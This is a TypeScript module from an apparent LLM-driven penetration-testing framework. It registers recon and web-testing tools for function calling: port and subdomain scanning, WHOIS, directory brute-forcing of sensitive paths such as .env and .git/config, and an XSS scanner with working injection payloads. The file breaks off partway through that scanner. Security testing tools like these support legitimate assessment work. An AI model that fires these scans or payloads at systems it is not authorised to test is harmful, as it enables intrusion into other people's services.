/**
 * T3MP3ST Arsenal
 *
 * Tool registry and execution management.
 */

import { EventEmitter } from 'eventemitter3';
import { randomUUID, createHmac } from 'crypto';
import { execFile } from 'child_process';
import { promisify } from 'util';
import * as net from 'net';
import * as dns from 'dns';
import * as tls from 'tls';
import * as https from 'https';
import { existsSync, readFileSync, readdirSync, unlinkSync } from 'fs';
import { join as pathJoin } from 'path';

const execFileAsync = promisify(execFile);
import type {
  CustomTool,
  ToolContext,
  ToolResult,
  Target,
  LLMToolDefinition,
} from '../types/index.js';
import type { LLMBackbone } from '../llm/index.js';
const dnsResolve = promisify(dns.resolve);
const dnsResolve4 = promisify(dns.resolve4);
const dnsResolveMx = promisify(dns.resolveMx);
const dnsResolveTxt = promisify(dns.resolveTxt);
const dnsResolveNs = promisify(dns.resolveNs);
const dnsResolveCname = promisify(dns.resolveCname);
const dnsReverse = promisify(dns.reverse);

import { CVE_DATABASE } from '../stubs/index.js';
import type { CVEEntry } from '../stubs/index.js';

// =============================================================================
// PORT SCANNING UTILITY
// =============================================================================

async function checkPort(host: string, port: number, timeout: number = 2000): Promise<boolean> {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    socket.setTimeout(timeout);

    socket.on('connect', () => {
      socket.destroy();
      resolve(true);
    });

    socket.on('timeout', () => {
      socket.destroy();
      resolve(false);
    });

    socket.on('error', () => {
      socket.destroy();
      resolve(false);
    });

    socket.connect(port, host);
  });
}

// =============================================================================
// EVENTS
// =============================================================================

export interface ArsenalEvents {
  'tool:registered': CustomTool;
  'tool:executed': { tool: CustomTool; result: ToolResult; durationMs: number };
  'tool:error': { tool: CustomTool; error: Error };
}

export interface ToolExecution {
  id: string;
  toolName: string;
  startedAt: number;
  completedAt?: number;
  result?: ToolResult;
  error?: string;
}

// =============================================================================
// ARSENAL
// =============================================================================

// Mission-level abort signal set by Arsenal.setAbortSignal() — respected by callSidecar
// so all in-flight binary/sandbox/cloud sidecar requests die when the mission stops.
let _activeAbortSignal: AbortSignal | null = null;

export class Arsenal extends EventEmitter<ArsenalEvents> {
  private tools: Map<string, CustomTool> = new Map();
  private executions: ToolExecution[] = [];
  private llmBackbone?: LLMBackbone;

  setLLM(llm: LLMBackbone): void {
    this.llmBackbone = llm;
  }

  setAbortSignal(signal: AbortSignal | null): void {
    _activeAbortSignal = signal;
  }

  /**
   * Register a tool
   */
  register(tool: CustomTool): void {
    this.tools.set(tool.name, tool);
    this.emit('tool:registered', tool);
  }

  /**
   * Register multiple tools
   */
  registerMany(tools: CustomTool[]): void {
    for (const tool of tools) {
      this.register(tool);
    }
  }

  /**
   * Get a tool by name
   */
  getTool(name: string): CustomTool | undefined {
    return this.tools.get(name);
  }

  /**
   * Get all tools
   */
  getAllTools(): CustomTool[] {
    return Array.from(this.tools.values());
  }

  /**
   * Get tools by category
   */
  getToolsByCategory(category: string): CustomTool[] {
    return this.getAllTools().filter(t => t.category === category);
  }

  /**
   * Execute a tool
   */
  async execute(
    toolName: string,
    context: ToolContext
  ): Promise<ToolResult> {
    const tool = this.tools.get(toolName.trim());
    if (!tool) {
      throw new Error(`Tool "${toolName}" not found`);
    }

    const execution: ToolExecution = {
      id: randomUUID(),
      toolName,
      startedAt: Date.now(),
    };
    this.executions.push(execution);

    const startTime = Date.now();

    try {
      const result = await tool.handler({ ...context, llm: this.llmBackbone });
      const durationMs = Date.now() - startTime;

      execution.completedAt = Date.now();
      execution.result = result;

      this.emit('tool:executed', { tool, result, durationMs });

      return result;
    } catch (error) {
      execution.completedAt = Date.now();
      execution.error = error instanceof Error ? error.message : String(error);

      this.emit('tool:error', { tool, error: error as Error });

      return {
        success: false,
        error: execution.error,
      };
    }
  }

  /**
   * Get execution history
   */
  getExecutions(): ToolExecution[] {
    return [...this.executions];
  }

  /**
   * Get tool categories
   */
  getCategories(): string[] {
    const categories = new Set<string>();
    for (const tool of this.tools.values()) {
      categories.add(tool.category);
    }
    return Array.from(categories);
  }

  /**
   * Convert registered tools to LLM tool definitions for function calling
   */
  getToolDefinitions(categories?: string[], names?: string[]): LLMToolDefinition[] {
    let tools = this.getAllTools();
    if (names?.length) {
      tools = tools.filter(t => names.includes(t.name));
    } else if (categories?.length) {
      tools = tools.filter(t => categories.includes(t.category));
    }
    return tools.map(tool => {
      const properties: Record<string, { type: string; description?: string; enum?: string[]; default?: unknown }> = {};
      const required: string[] = [];

      for (const param of tool.parameters || []) {
        properties[param.name] = {
          type: param.type,
          description: param.description,
        };
        if (param.default !== undefined) {
          properties[param.name].default = param.default;
        }
        if (param.required) {
          required.push(param.name);
        }
      }

      return {
        name: tool.name,
        description: tool.description,
        parameters: {
          type: 'object' as const,
          properties,
          required: required.length > 0 ? required : undefined,
        },
      };
    });
  }

  /**
   * Unregister a tool
   */
  unregister(name: string): boolean {
    return this.tools.delete(name);
  }

  /**
   * Clear all tools
   */
  clear(): void {
    this.tools.clear();
    this.executions = [];
  }
}

// =============================================================================
// HELPER FUNCTIONS
// =============================================================================

export function successResult(output: string, findings?: ToolResult['findings']): ToolResult {
  return {
    success: true,
    output,
    findings,
  };
}

export function failResult(error: string): ToolResult {
  return {
    success: false,
    error,
  };
}

export function createToolContext(
  target?: Target,
  parameters?: Record<string, unknown>
): ToolContext {
  return {
    target,
    parameters: parameters || {},
  };
}

// =============================================================================
// BUILT-IN TOOLS
// =============================================================================

export const BUILTIN_TOOLS: CustomTool[] = [
  // =============================================================================
  // RECONNAISSANCE TOOLS
  // =============================================================================
  {
    name: 'dns_lookup',
    description: 'Perform DNS lookup for a target',
    category: 'recon',
    parameters: [
      { name: 'domain', type: 'string', description: 'Domain to lookup', required: true },
      { name: 'type', type: 'string', description: 'Record type (A, AAAA, MX, TXT, NS)', required: false, default: 'A' },
    ],
    handler: async (context) => {
      const domain = context.parameters.domain as string;
      const recordType = (context.parameters.type as string || 'A').toUpperCase();

      try {
        let records: string[] = [];

        switch (recordType) {
          case 'A':
            records = await dnsResolve4(domain);
            break;
          case 'AAAA': {
            const aaaaRecords = await dnsResolve(domain, 'AAAA') as string[];
            records = Array.isArray(aaaaRecords) ? aaaaRecords : [String(aaaaRecords)];
            break;
          }
          case 'MX': {
            const mxRecords = await dnsResolveMx(domain);
            records = mxRecords.map(r => `${r.priority} ${r.exchange}`);
            break;
          }
          case 'TXT': {
            const txtRecords = await dnsResolveTxt(domain);
            records = txtRecords.map(r => Array.isArray(r) ? r.join('') : String(r));
            break;
          }
          case 'NS':
            records = await dnsResolveNs(domain);
            break;
          case 'SOA': {
            const soaRecord = await dnsResolve(domain, 'SOA') as unknown;
            if (soaRecord && typeof soaRecord === 'object') {
              const s = soaRecord as { nsname?: string; hostmaster?: string; serial?: number; refresh?: number; retry?: number; expire?: number; minttl?: number };
              records = [
                `nsname: ${s.nsname ?? ''}`,
                `hostmaster: ${s.hostmaster ?? ''}`,
                `serial: ${s.serial ?? ''}`,
                `refresh: ${s.refresh ?? ''}  retry: ${s.retry ?? ''}  expire: ${s.expire ?? ''}  minttl: ${s.minttl ?? ''}`,
              ];
            }
            break;
          }
          case 'CNAME':
            records = await dnsResolveCname(domain);
            break;
          default: {
            const raw = await dnsResolve(domain, recordType) as unknown;
            records = Array.isArray(raw) ? (raw as unknown[]).map(r => typeof r === 'string' ? r : JSON.stringify(r)) : [JSON.stringify(raw)];
          }
        }

        return {
          success: true,
          output: `DNS ${recordType} lookup for ${domain}:\n${records.join('\n')}`,
        };
      } catch (error) {
        const msg = error instanceof Error ? error.message : String(error);
        // ENODATA = record type simply doesn't exist for this domain (normal, not an error)
        if (msg.includes('ENODATA') || msg.includes('ENOTFOUND')) {
          return {
            success: true,
            output: `DNS ${recordType} lookup for ${domain}: no records found (${msg.includes('ENOTFOUND') ? 'domain not found' : 'record type not present'})`,
          };
        }
        return {
          success: false,
          error: `DNS lookup failed: ${msg}`,
        };
      }
    },
  },
  {
    name: 'port_scan',
    description: 'Scan ports on a target (real TCP connect scan)',
    category: 'recon',
    parameters: [
      { name: 'target', type: 'string', description: 'Target IP or hostname', required: true },
      { name: 'ports', type: 'string', description: 'Ports to scan (e.g., "22,80,443")', required: false, default: '22,80,443,8080' },
      { name: 'timeout', type: 'number', description: 'Timeout per port in ms', required: false, default: 2000 },
    ],
    handler: async (context) => {
      const target = context.parameters.target as string || context.target?.address;
      if (!target) {
        return { success: false, error: 'No target specified' };
      }

      const portsStr = context.parameters.ports as string || '22,80,443,8080';
      const ports = portsStr.split(',').map(p => parseInt(p.trim(), 10)).filter(p => !isNaN(p));
      const timeout = (context.parameters.timeout as number) || 2000;

      const portServices: Record<number, string> = {
        21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp', 53: 'dns',
        80: 'http', 110: 'pop3', 143: 'imap', 443: 'https', 445: 'smb',
        3306: 'mysql', 3389: 'rdp', 5432: 'postgresql', 5900: 'vnc',
        6379: 'redis', 8080: 'http-proxy', 8443: 'https-alt', 27017: 'mongodb',
      };

      const results: string[] = [];
      const openPorts: number[] = [];

      // Scan ports in parallel with concurrency limit
      const concurrency = 10;
      for (let i = 0; i < ports.length; i += concurrency) {
        const batch = ports.slice(i, i + concurrency);
        const checks = await Promise.all(
          batch.map(async (port) => {
            const isOpen = await checkPort(target, port, timeout);
            return { port, isOpen };
          })
        );

        for (const { port, isOpen } of checks) {
          if (isOpen) {
            openPorts.push(port);
            results.push(`${port}/tcp open ${portServices[port] || 'unknown'}`);
          } else {
            results.push(`${port}/tcp closed`);
          }
        }
      }

      return {
        success: true,
        output: `Port scan of ${target} (${ports.length} ports scanned):\n${results.join('\n')}\n\nOpen ports: ${openPorts.length}`,
        findings: openPorts.length > 0 ? [{
          title: 'Open Ports Detected',
          severity: 'info',
          details: `Found ${openPorts.length} open ports: ${openPorts.join(', ')}`,
        }] : undefined,
      };
    },
  },
  {
    name: 'subdomain_enum',
    description: 'Enumerate subdomains for a domain (real DNS resolution)',
    category: 'recon',
    parameters: [
      { name: 'domain', type: 'string', description: 'Domain to enumerate', required: true },
      { name: 'wordlist', type: 'string', description: 'Wordlist: common, extended', required: false, default: 'common' },
    ],
    handler: async (context) => {
      const domain = context.parameters.domain as string;
      const wordlistType = context.parameters.wordlist as string || 'common';

      // Try subfinder first — much more comprehensive than wordlist brute-force
      try {
        const sfResult = await execFileAsync('subfinder', ['-d', domain, '-silent', '-timeout', '30'], { timeout: 60000 });
        const sfLines = sfResult.stdout.trim().split('\n').filter(Boolean);
        if (sfLines.length > 0) {
          // Resolve IPs for found subdomains
          const resolved: { subdomain: string; ip: string }[] = [];
          await Promise.all(sfLines.map(async (sub) => {
            try {
              const addrs = await dnsResolve4(sub.trim());
              resolved.push({ subdomain: sub.trim(), ip: addrs[0] ?? '' });
            } catch {
              resolved.push({ subdomain: sub.trim(), ip: '(unresolved)' });
            }
          }));
          const output = resolved.map(f => `${f.subdomain} -> ${f.ip}`).join('\n');
          return {
            success: true,
            output: `Subdomain enumeration for ${domain} (subfinder):\nFound ${resolved.length} subdomains:\n${output}`,
            findings: [{
              title: 'Subdomains Discovered',
              severity: 'info',
              details: `Found ${resolved.length} active subdomains via subfinder`,
            }],
          };
        }
      } catch { /* subfinder not available — fall through to wordlist */ }

      // Fallback: wordlist DNS brute-force
      const wordlists: Record<string, string[]> = {
        common: ['www', 'mail', 'ftp', 'admin', 'dev', 'staging', 'api', 'app', 'cdn', 'static', 'test', 'blog', 'shop', 'store', 'portal', 'secure', 'vpn', 'remote', 'webmail', 'ns1', 'ns2'],
        extended: ['www', 'mail', 'ftp', 'admin', 'dev', 'staging', 'api', 'app', 'cdn', 'static', 'test', 'blog', 'shop', 'store', 'portal', 'secure', 'vpn', 'remote', 'webmail', 'ns1', 'ns2', 'mx', 'smtp', 'pop', 'imap', 'cpanel', 'whm', 'webdisk', 'autodiscover', 'autoconfig', 'git', 'gitlab', 'jenkins', 'ci', 'jira', 'confluence', 'wiki', 'docs', 'status', 'monitor', 'grafana', 'prometheus', 'elastic', 'kibana', 'redis', 'mysql', 'postgres', 'mongo', 'db', 'database', 'backup', 'files', 'media', 'assets', 'images', 'img', 'video', 'download', 'upload'],
      };

      const prefixes = wordlists[wordlistType] || wordlists.common;
      const found: { subdomain: string; ip: string }[] = [];

      const concurrency = 10;
      for (let i = 0; i < prefixes.length; i += concurrency) {
        const batch = prefixes.slice(i, i + concurrency);
        const checks = await Promise.all(
          batch.map(async (prefix) => {
            const subdomain = `${prefix}.${domain}`;
            try {
              const addresses = await dnsResolve4(subdomain);
              return { subdomain, ip: addresses[0], found: true };
            } catch {
              return { subdomain, ip: '', found: false };
            }
          })
        );
        for (const result of checks) {
          if (result.found) found.push({ subdomain: result.subdomain, ip: result.ip });
        }
      }

      if (found.length === 0) {
        return {
          success: true,
          output: `Subdomain enumeration for ${domain}:\nNo subdomains found from ${prefixes.length} candidates tested.`,
        };
      }

      const output = found.map(f => `${f.subdomain} -> ${f.ip}`).join('\n');
      return {
        success: true,
        output: `Subdomain enumeration for ${domain}:\nFound ${found.length} subdomains (tested ${prefixes.length}):\n${output}`,
        findings: [{
          title: 'Subdomains Discovered',
          severity: 'info',
          details: `Found ${found.length} active subdomains`,
        }],
      };
    },
  },
  {
    name: 'whois_lookup',
    description: 'Perform WHOIS lookup for a domain (real WHOIS query)',
    category: 'recon',
    parameters: [
      { name: 'domain', type: 'string', description: 'Domain to lookup', required: true },
    ],
    handler: async (context) => {
      const domain = context.parameters.domain as string;

      // Determine WHOIS server based on TLD
      const tld = domain.split('.').pop()?.toLowerCase() || '';
      const whoisServers: Record<string, string> = {
        'com': 'whois.verisign-grs.com',
        'net': 'whois.verisign-grs.com',
        'org': 'whois.pir.org',
        'io': 'whois.nic.io',
        'co': 'whois.nic.co',
        'info': 'whois.afilias.net',
        'biz': 'whois.biz',
        'me': 'whois.nic.me',
        'dev': 'whois.nic.google',
        'app': 'whois.nic.google',
        'uk': 'whois.nic.uk',
        'de': 'whois.denic.de',
        'fr': 'whois.nic.fr',
        'eu': 'whois.eu',
        'nl': 'whois.domain-registry.nl',
        'au': 'whois.auda.org.au',
      };

      const whoisServer = whoisServers[tld] || `whois.nic.${tld}`;

      return new Promise((resolve) => {
        const socket = new net.Socket();
        let data = '';

        socket.setTimeout(10000);

        socket.on('connect', () => {
          socket.write(`${domain}\r\n`);
        });

        socket.on('data', (chunk) => {
          data += chunk.toString();
        });

        socket.on('close', () => {
          if (data.length === 0) {
            resolve({
              success: false,
              error: `No WHOIS data received for ${domain}`,
            });
            return;
          }

          // Extract key fields from WHOIS response
          const lines = data.split('\n');
          const extracted: string[] = [];
          const importantFields = [
            'domain name', 'registrar', 'creation date', 'updated date',
            'expiration date', 'registry expiry', 'registrant',
            'name server', 'status', 'dnssec', 'registrar abuse',
          ];

          for (const line of lines) {
            const lineLower = line.toLowerCase();
            if (importantFields.some(field => lineLower.includes(field))) {
              extracted.push(line.trim());
            }
          }

          // Truncate if too long
          const output = extracted.length > 0
            ? extracted.slice(0, 20).join('\n')
            : data.slice(0, 2000);

          resolve({
            success: true,
            output: `WHOIS for ${domain} (via ${whoisServer}):\n\n${output}${extracted.length > 20 ? '\n... (truncated)' : ''}`,
          });
        });

        socket.on('error', (err) => {
          resolve({
            success: false,
            error: `WHOIS lookup failed: ${err.message}`,
          });
        });

        socket.on('timeout', () => {
          socket.destroy();
          resolve({
            success: false,
            error: `WHOIS lookup timed out for ${domain}`,
          });
        });

        socket.connect(43, whoisServer);
      });
    },
  },

  // =============================================================================
  // WEB TESTING TOOLS
  // =============================================================================
  {
    name: 'http_request',
    description: 'Make an HTTP request to a target',
    category: 'web',
    parameters: [
      { name: 'url', type: 'string', description: 'URL to request', required: true },
      { name: 'method', type: 'string', description: 'HTTP method', required: false, default: 'GET' },
      { name: 'headers', type: 'object', description: 'Request headers', required: false },
      { name: 'body', type: 'string', description: 'Request body', required: false },
    ],
    handler: async (context) => {
      const url = context.parameters.url as string;
      const method = (context.parameters.method as string) || 'GET';
      const headers = (context.parameters.headers as Record<string, string>) || {};
      const body = context.parameters.body as string | undefined;

      try {
        const response = await fetch(url, {
          method,
          headers,
          body: body && method !== 'GET' ? body : undefined,
          signal: AbortSignal.timeout(10000),
        });

        const responseHeaders = Object.fromEntries(response.headers.entries());
        return {
          success: true,
          output: `HTTP ${method} ${url}\nStatus: ${response.status} ${response.statusText}\nHeaders: ${JSON.stringify(responseHeaders, null, 2)}`,
        };
      } catch (error) {
        return {
          success: false,
          error: `Failed to fetch: ${error instanceof Error ? error.message : String(error)}`,
        };
      }
    },
  },
  {
    name: 'header_analysis',
    description: 'Analyze security headers of a URL',
    category: 'web',
    parameters: [
      { name: 'url', type: 'string', description: 'URL to analyze', required: true },
    ],
    handler: async (context) => {
      const url = context.parameters.url as string;
      const securityHeaders = [
        'Strict-Transport-Security', 'Content-Security-Policy', 'X-Frame-Options',
        'X-Content-Type-Options', 'X-XSS-Protection', 'Referrer-Policy',
        'Permissions-Policy', 'Cross-Origin-Opener-Policy', 'Cross-Origin-Resource-Policy',
      ];
      try {
        const response = await fetch(url, { method: 'HEAD', signal: AbortSignal.timeout(10000) });
        const analysis = securityHeaders.map(h => {
          const value = response.headers.get(h);
          return `${h}: ${value ? `✓ ${value}` : '✗ Missing'}`;
        });
        return {
          success: true,
          output: `Security Header Analysis for ${url}:\n${analysis.join('\n')}`,
        };
      } catch (error) {
        return { success: false, error: `Failed: ${error instanceof Error ? error.message : String(error)}` };
      }
    },
  },
  {
    name: 'dir_bruteforce',
    description: 'Bruteforce directories on a web server (real HTTP requests)',
    category: 'web',
    parameters: [
      { name: 'url', type: 'string', description: 'Base URL to scan', required: true },
      { name: 'wordlist', type: 'string', description: 'Wordlist type: common, admin, api, files', required: false, default: 'common' },
      { name: 'timeout', type: 'number', description: 'Timeout per request in ms', required: false, default: 5000 },
    ],
    handler: async (context) => {
      const baseUrl = (context.parameters.url as string).replace(/\/$/, '');
      const wordlistType = context.parameters.wordlist as string || 'common';
      const timeout = (context.parameters.timeout as number) || 5000;

      const wordlists: Record<string, string[]> = {
        common: ['admin', 'login', 'dashboard', 'api', 'backup', 'config', 'test', 'dev', 'staging', '.git', '.git/config', '.env', 'robots.txt', 'sitemap.xml', '.htaccess', 'wp-config.php', 'web.config'],
        admin: ['admin', 'administrator', 'wp-admin', 'phpmyadmin', 'cpanel', 'manager', 'console', 'panel', 'admin.php', 'login.php', 'controlpanel', 'adminpanel'],
        api: ['api', 'api/v1', 'api/v2', 'api/v3', 'graphql', 'rest', 'swagger', 'swagger-ui', 'docs', 'openapi', 'api-docs', 'health', 'status', 'metrics'],
        files: ['backup.zip', 'backup.tar.gz', 'db.sql', 'database.sql', 'dump.sql', '.git/HEAD', '.svn/entries', 'composer.json', 'package.json', '.DS_Store', 'Thumbs.db', 'debug.log', 'error.log'],
      };

      const words = wordlists[wordlistType] || wordlists.common;
      const found: { path: string; status: number; size?: number }[] = [];

      // Canary probe: if a known-nonexistent path returns 403 the CDN/WAF 403s everything.
      let cdnGating = false;
      try {
        const canaryResp = await fetch(`${baseUrl}/t3mp3st-canary-probe-xq7z9`, {
          method: 'GET',
          signal: AbortSignal.timeout(timeout),
          redirect: 'manual',
        });
        if (canaryResp.status === 403) cdnGating = true;
      } catch { /* network error — proceed with default behaviour */ }

      // Per-response CDN detection: Cloudflare (and similar) may return 403 only for
      // sensitive-looking paths (not everything), so the canary above won't catch it.
      // Check each 403 response for CDN fingerprint headers before counting it as "found".
      const isCdnBlock = (status: number, headers: Headers): boolean => {
        if (status !== 403) return false;
        return !!(
          headers.get('cf-ray') ||
          (headers.get('server') || '').toLowerCase().includes('cloudflare') ||
          (headers.get('server') || '').toLowerCase().includes('akamai') ||
          (headers.get('server') || '').toLowerCase().includes('fastly')
        );
      };

      // 3xx redirects are NOT interesting — on HTTP URLs a CDN/proxy returns 301 for every path
      // (HTTP→HTTPS passthrough), so treating 301 as "found" generates massive false positives.
      // 403 is excluded when the canary confirms CDN-gating (server 403s everything).
      const interesting = cdnGating ? [200, 201, 401] : [200, 201, 401, 403];
      let sampleRequestEvidence: string | undefined;
      let sampleResponseEvidence: string | undefined;

      // Scan paths in parallel with concurrency limit
      const concurrency = 5;
      for (let i = 0; i < words.length; i += concurrency) {
        const batch = words.slice(i, i + concurrency);
        const checks = await Promise.all(
          batch.map(async (path) => {
            const fullUrl = `${baseUrl}/${path}`;
            try {
              const response = await fetch(fullUrl, {
                method: 'GET',
                signal: AbortSignal.timeout(timeout),
                redirect: 'manual',
              });
              const contentLength = response.headers.get('content-length');
              const isInteresting = interesting.includes(response.status) && !isCdnBlock(response.status, response.headers);
              // Capture evidence from the first interesting response
              let reqEvidence: string | undefined;
              let respEvidence: string | undefined;
              if (isInteresting && !sampleRequestEvidence) {
                const parsedBase = new URL(fullUrl);
                reqEvidence = `GET ${parsedBase.pathname} HTTP/1.1\r\nHost: ${parsedBase.host}\r\nUser-Agent: T3MP3ST/1.0`;
                const respHeaderLines: string[] = [];
                response.headers.forEach((v, k) => respHeaderLines.push(`${k}: ${v}`));
                respEvidence = `HTTP/1.1 ${response.status} ${response.statusText}\r\n${respHeaderLines.join('\r\n')}`;
              }
              return {
                path: `/${path}`,
                status: response.status,
                size: contentLength ? parseInt(contentLength, 10) : undefined,
                interesting: isInteresting,
                reqEvidence,
                respEvidence,
              };
            } catch {
              return { path: `/${path}`, status: 0, interesting: false, reqEvidence: undefined, respEvidence: undefined };
            }
          })
        );

        for (const result of checks) {
          if (result.interesting) {
            found.push({ path: result.path, status: result.status, size: result.size });
            if (!sampleRequestEvidence && result.reqEvidence) {
              sampleRequestEvidence = result.reqEvidence;
              sampleResponseEvidence = result.respEvidence;
            }
          }
        }
      }

      if (found.length === 0) {
        const cdnMsg = cdnGating ? ' CDN/WAF detected — 403 responses excluded.' : '';
        return {
          success: true,
          output: `Directory bruteforce on ${baseUrl}:\nNo interesting paths found from ${words.length} tested.${cdnMsg}`,
        };
      }

      const output = found.map(f => `${f.path} -> ${f.status}${f.size ? ` (${f.size} bytes)` : ''}`).join('\n');
      const critical = found.filter(f => f.path.includes('.git') || f.path.includes('.env') || f.path.includes('backup'));

      const dirBfEvidence: ToolResult['additionalEvidence'] = [];
      if (sampleRequestEvidence) {
        dirBfEvidence.push({ type: 'request', content: sampleRequestEvidence, metadata: { baseUrl, note: 'sample from first interesting probe' } });
      }
      if (sampleResponseEvidence) {
        dirBfEvidence.push({ type: 'response', content: sampleResponseEvidence, metadata: { baseUrl } });
      }

      const cdnNote = cdnGating ? '\nNote: CDN/WAF detected (canary returned 403) — 403 responses excluded to avoid false positives.' : '';
      return {
        success: true,
        output: `Directory bruteforce on ${baseUrl}:\nFound ${found.length} interesting paths (tested ${words.length}):\n${output}${cdnNote}`,
        findings: critical.length > 0 ? [{
          title: 'Sensitive Paths Exposed',
          severity: 'high',
          details: `Found potentially sensitive paths: ${critical.map(c => c.path).join(', ')}`,
          provenance: 'tool' as const,
          toolName: 'dir_bruteforce',
        }] : found.length > 0 ? [{
          title: 'Directories Discovered',
          severity: 'info',
          details: `Found ${found.length} accessible paths${cdnGating ? ' (CDN/WAF present — 403 responses excluded)' : ''}`,
          provenance: 'tool' as const,
          toolName: 'dir_bruteforce',
        }] : undefined,
        additionalEvidence: dirBfEvidence.length > 0 ? dirBfEvidence : undefined,
      };
    },
  },
  {
    name: 'technology_detect',
    description: 'Detect technologies used by a website (real analysis)',
    category: 'web',
    parameters: [
      { name: 'url', type: 'string', description: 'URL to analyze', required: true },
    ],
    handler: async (context) => {
      const url = context.parameters.url as string;

      try {
        const response = await fetch(url, {
          signal: AbortSignal.timeout(10000),
        });

        const headers = Object.fromEntries(response.headers.entries());
        const body = await response.text();
        const detected: { tech: string; evidence: string }[] = [];

        // Server detection from headers
        if (headers['server']) {
          detected.push({ tech: headers['server'], evidence: 'Server header' });
        }
        if (headers['x-powered-by']) {
          detected.push({ tech: headers['x-powered-by'], evidence: 'X-Powered-By header' });
        }

        // CDN/Proxy detection
        if (headers['cf-ray']) detected.push({ tech: 'Cloudflare', evidence: 'CF-Ray header' });
        if (headers['x-amz-cf-id']) detected.push({ tech: 'AWS CloudFront', evidence: 'x-amz-cf-id header' });
        if (headers['x-vercel-id']) detected.push({ tech: 'Vercel', evidence: 'x-vercel-id header' });
        if (headers['x-netlify-id']) detected.push({ tech: 'Netlify', evidence: 'x-netlify-id header' });

        // Framework detection from HTML
        if (body.includes('wp-content') || body.includes('wp-includes')) {
          detected.push({ tech: 'WordPress', evidence: 'wp-content/wp-includes paths' });
        }
        if (body.includes('_next/static') || body.includes('__NEXT_DATA__')) {
          detected.push({ tech: 'Next.js', evidence: '_next paths or __NEXT_DATA__' });
        }
        if (body.includes('/_nuxt/')) {
          detected.push({ tech: 'Nuxt.js', evidence: '_nuxt paths' });
        }
        if (body.includes('ng-version') || body.includes('ng-app')) {
          detected.push({ tech: 'Angular', evidence: 'ng-version/ng-app attributes' });
        }
        if (body.includes('data-reactroot') || body.includes('__REACT_DEVTOOLS')) {
          detected.push({ tech: 'React', evidence: 'React markers in HTML' });
        }
        if (body.includes('data-v-') || body.includes('Vue.js')) {
          detected.push({ tech: 'Vue.js', evidence: 'Vue.js markers' });
        }
        if (body.includes('jquery') || body.includes('jQuery')) {
          detected.push({ tech: 'jQuery', evidence: 'jQuery references' });
        }
        if (body.includes('bootstrap')) {
          detected.push({ tech: 'Bootstrap', evidence: 'Bootstrap CSS/JS' });
        }
        if (body.includes('tailwind')) {
          detected.push({ tech: 'Tailwind CSS', evidence: 'Tailwind references' });
        }

        // CMS detection
        if (body.includes('Drupal') || body.includes('drupal.js')) {
          detected.push({ tech: 'Drupal', evidence: 'Drupal markers' });
        }
        if (body.includes('Joomla') || body.includes('/media/jui/')) {
          detected.push({ tech: 'Joomla', evidence: 'Joomla markers' });
        }
        if (body.includes('Shopify') || body.includes('cdn.shopify.com')) {
          detected.push({ tech: 'Shopify', evidence: 'Shopify CDN' });
        }

        // Meta generator tag
        const generatorMatch = body.match(/<meta[^>]*name=["']generator["'][^>]*content=["']([^"']+)["']/i);
        if (generatorMatch) {
          detected.push({ tech: generatorMatch[1], evidence: 'Meta generator tag' });
        }

        if (detected.length === 0) {
          return {
            success: true,
            output: `Technology detection for ${url}:\nNo technologies detected from headers or content.`,
          };
        }

        const output = detected.map(d => `• ${d.tech} (${d.evidence})`).join('\n');
        return {
          success: true,
          output: `Technology detection for ${url}:\n${output}`,
          findings: [{
            title: 'Technologies Detected',
            severity: 'info',
            details: `Detected ${detected.length} technologies: ${detected.map(d => d.tech).join(', ')}`,
          }],
        };
      } catch (error) {
        return {
          success: false,
          error: `Technology detection failed: ${error instanceof Error ? error.message : String(error)}`,
        };
      }
    },
  },

  // =============================================================================
  // VULNERABILITY SCANNING TOOLS
  // =============================================================================
  {
    name: 'xss_scan',
    description: 'Test for XSS vulnerabilities — tests all URL params by default, probes POST form fields, checks for unencoded reflection',
    category: 'vuln',
    parameters: [
      { name: 'url', type: 'string', description: 'URL to test (with or without query params)', required: true },
      { name: 'param', type: 'string', description: 'Specific param to test; omit to test all params found in URL + common form fields', required: false, default: '' },
    ],
    handler: async (context) => {
      const baseUrl = context.parameters.url as string;
      const paramOverride = String(context.parameters.param ?? '').trim();

      // Unique nonce per scan so we can confirm OUR payload is what was reflected
      const nonce = Math.random().toString(36).slice(2, 10);

      const payloads = [
        { payload: `<script>alert('xss-${nonce}')</script>`, name: 'Basic script tag', marker: `xss-${nonce}` },
        { payload: `<img src=x onerror=alert('xss-${nonce}')>`, name: 'IMG onerror', marker: `xss-${nonce}` },
        { payload: `"><svg onload=alert('xss-${nonce}')>`, name: 'SVG breakout', marker: `xss-${nonce}` },
        { payload: `'"><details open ontoggle=alert('xss-${nonce}')>`, name: 'Details ontoggle', marker: `xss-${nonce}` },
        { payload: `javascript:alert('xss-${nonce}')`, name: 'JS URI scheme', marker: `xss-${nonce}` },
        { payload: `<iframe src="javascript:alert('xss-${nonce}')">`, name: 'Iframe JS src', marker: `xss-${nonce}` },
        { payload: `\`-alert('xss-${nonce}')-\``, name: 'JS template literal breakout', marker: `xss-${nonce}` },
        { payload: `<input autofocus onfocus=alert('xss-${nonce}')>`, name: 'Input autofocus', marker: `xss-${nonce}` },
      ];

      // Determine which params to test
      let paramsToTest: string[] = [];
      try {
        const u = new URL(baseUrl);
        if (paramOverride) {
          paramsToTest = [paramOverride];
        } else {
          paramsToTest = Array.from(u.searchParams.keys());
          if (paramsToTest.length === 0) {
            paramsToTest = ['q', 'search', 'query', 'keyword', 's', 'input', 'text', 'name', 'message', 'comment', 'data'];
          }
        }
      } catch {
        return { success: false, error: `Invalid URL: ${baseUrl}` };
      }

      const allFindings: NonNullable<ToolResult['findings']> = [];
      const outputLines: string[] = [`XSS scan on ${baseUrl} (nonce: xss-${nonce})`];

      // Helper: build a request/response evidence snippet
      const buildPacket = (method: string, url: string, reqHeaders: string, status: number, respHeaders: string, body: string, marker: string): { req: string; resp: string } => {
        const matchIdx = body.indexOf(marker);
        const snippet = matchIdx >= 0
          ? body.slice(Math.max(0, matchIdx - 80), matchIdx + marker.length + 80).replace(/\s+/g, ' ')
          : body.slice(0, 200).replace(/\s+/g, ' ');
        return {
          req: `${method} ${url}\n${reqHeaders}`,
          resp: `HTTP/1.1 ${status}\n${respHeaders}\n\n...${snippet}...`,
        };
      };

      // Detect the reflection context — helps analysts pick the right exploit
      const detectContext = (body: string, marker: string): string => {
        const idx = body.indexOf(marker);
        if (idx === -1) return 'none';
        const window = body.slice(Math.max(0, idx - 120), idx + marker.length + 120);
        // Inside a <script> block?
        const scriptBefore = body.lastIndexOf('<script', idx);
        const scriptEnd = body.indexOf('</script>', idx);
        const scriptClose = body.lastIndexOf('</script>', idx);
